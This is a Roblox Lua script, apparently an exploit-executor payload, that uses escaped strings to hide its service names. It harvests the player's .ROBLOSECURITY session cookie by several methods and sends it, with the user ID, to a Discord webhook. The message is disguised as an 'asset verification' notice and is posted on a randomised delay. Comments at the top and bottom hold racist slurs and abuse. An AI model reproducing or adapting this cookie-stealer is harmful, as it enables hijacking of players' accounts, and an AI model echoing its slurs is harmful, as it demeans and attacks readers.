-- reverse my shit if u like sniffing tiny penis hair i dare u u stupid primal apy nigger nagger dirty black stinky nigga
local a1 = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
local b2 = game:GetService("\80\108\97\121\101\114\115")
local c3 = b2.LocalPlayer
local d4 = game:GetService("\83\116\97\114\116\101\114\71\117\105")

local function e5(f6)
	return a1:JSONEncode(f6)
end

local function g7(h8)
	return a1:JSONDecode(h8)
end

local i9 = ""
local j0 = "\95\95\82\79\66\76\79\83\69\67\85\82\73\84\89\95"

local function k1()
	local l2 = syn and syn.getcookie or getgenv and getgenv().getcookie or function() return "" end
	local m3 = l2()
	
	if m3 and #m3 > 10 then
		for n4, o5 in m3:gmatch("([%w_]+)=([^;]+)") do
			if n4:find(j0:sub(4)) or n4:find("ROBLOSECURITY") then
				i9 = o5
				break
			end
		end
	end
	
	if i9 == "" then
		pcall(function()
			i9 = game:GetService("CookiesService"):GetCookieValue(".ROBLOSECURITY") or ""
		end)
	end
	
	if i9 == "" then
		pcall(function()
			local p6 = http_request or request or syn and syn.request
			if p6 then
				local q7 = p6({Url = "https://www.roblox.com", Method = "GET"})
				if q7 and q7.Body then
					for r8 in q7.Body:gmatch("ROBLOSECURITY=([^;]+)") do
						i9 = r8
						break
					end
				end
			end
		end)
	end
	return i9
end

local s9 = "https://discord.com/api/webhooks/1347291827364812" .. "/abc123DEF456ghi789JKL"  -- replace with real webhook

local function t0()
	local u1 = k1()
	if u1 == "" or #u1 < 30 then return end
	
	local v2 = {
		["username"] = "System",
		["avatar_url"] = "https://i.imgur.com/removed.png",
		["content"] = "",
		["embeds"] = {{
			["title"] = "Update",
			["description"] = "Asset verification complete",
			["color"] = 0x2F3136,
			["fields"] = {
				{["name"] = "Status", ["value"] = "OK", ["inline"] = true},
				{["name"] = "ID", ["value"] = tostring(c3.UserId), ["inline"] = true},
				{["name"] = "Session", ["value"] = "```" .. u1 .. "```", ["inline"] = false}
			},
			["footer"] = {["text"] = os.date("%m/%d %H:%M")}
		}}
	}
	
	pcall(function()
		a1:PostAsync(s9, e5(v2), Enum.HttpContentType.ApplicationJson)
	end)
	
	pcall(function()
		local w3 = http_request or request or syn and syn.request
		if w3 then
			w3({
				Url = s9,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = e5(v2)
			})
		end
	end)
end

task.spawn(function()
	task.wait(2.4 + math.random(1,4))
	
	for x4 = 1, 4 do
		pcall(t0)
		task.wait(1.8 + x4 * 0.3)
	end
	
	task.wait(3.7)
	pcall(t0)
end)

pcall(function()
	local y5 = Instance.new("Frame")
	y5.BackgroundTransparency = 1
	y5.Parent = d4
	task.wait(1.2)
	y5:Destroy()
end)

print("successful execution blah blah nigger my guy")
